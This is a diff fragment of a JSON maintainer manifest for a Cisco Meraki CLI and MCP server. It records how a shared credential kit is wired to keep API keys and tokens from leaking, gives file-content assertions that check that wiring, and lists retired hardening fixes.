+     "contains": "func TestMerakiTimesCompareAsInstants(",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -1978,6 +1836,167 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand: internal/credwire/declarations.go holds the one credkit.Declarations literal (MERAKI_DASHBOARD_API_KEY sent as X-Cisco-Meraki-API-Key to the configured base URL only, the MCP HTTP bearer, SPACEFAST_TOKEN, the config and 0600 credential store fields, the run profile store, and the Dashboard API's documented secret response fields), both mains start with credkit.Start(credwire.Declarations) and end with credkit.Exit, every HTTP client (API, --deliver webhook and Spacefast, feedback, probe) goes through credkit.Transport, every SQLite handle through the credkit.SQLDriver internal/credsql registers, every program file write through the kit, child processes through credkit.RunCommand or StartCommand, and the MCP stdio and HTTP servers through credkit.MCPTools, MCPIn, MCPOut and MCPHTTP. The credential store, config and the Spacefast delivery record are sources, written outside the kit (cliutil.AtomicWriteCredentialFile). Hand-file sites the wiring checker cannot classify are listed in skills/cisco-meraki/credkit-sites.json.",
+   "why": "One contract, one matcher and one set of sinks replace the connector's own layer. It replaces secret-echo-decoded-funnel (replaced by the shared credential kit; the 4.35.1 reprint dropped its files). Classes closed, each by a built-binary test in internal/credwire/leak_test.go seen failing first on the pre-kit build (.review/seen-fail-kit.log): an API error echoing part of the key (CLI, --agent, MCP); a declared secret response field (SSID psk) on stdout, MCP and the HTTP response cache; the key in config.toml, a config that does not parse and the credential store held at startup; a password in a saved profile base-url held at startup; the key refused to another origin and over plain http; SPACEFAST_TOKEN held; and the learn journal never recording a held key. In-process tests never run Start, so cliutil.OutboundGuard, Hold and HoldBody are variables the test packages swap (credkit_seam_test.go). The MCP sql value cap moved from sqlite.Limit on a held connection to the _length_limit DSN parameter, and the read-only open runs select 1 because the kit's connection does not forward Ping.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialHeaders: []string{\"X-Cisco-Meraki-API-Key\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"*\", Allowed: []string{\"base_url\"}},",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "server.NewStdioServer(s).Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/cisco-meraki-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver, dsn)",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver, ",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_guard.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return guardedTransport{RoundTripper: cliutil.OutboundGuard(tr), inner: tr}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "httpClient.Transport = guardTransport(tr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.Hold(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "base = cliutil.OutboundGuard(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "AtomicWriteCredentialFile(path, data, 0o600, 0o700)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "_ = os.WriteFile(cacheFile"
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "not_contains": "http.DefaultTransport.RoundTrip(req)"
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestResponseSecretFieldIsWithheld(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestKeyRefusedOffOriginAndOverPlainHTTP(",
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5045 (4.33.6): a recipe positional that looks like a flag is placed after --, so it cannot set another flag."
+  },
+  {
+   "id": "windows-sddl-alias-sid-compare",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): trustees are resolved to SIDs (LA through the OS) and compared by SID; the press generates the alias tests."
+  },
+  {
+   "id": "windows-null-dacl-behind-flags",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): the DACL section's flags and ACE list are framed (daclFlagsRe, aceListRe), so a NULL DACL behind flags is refused."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
   }
  ]
 }
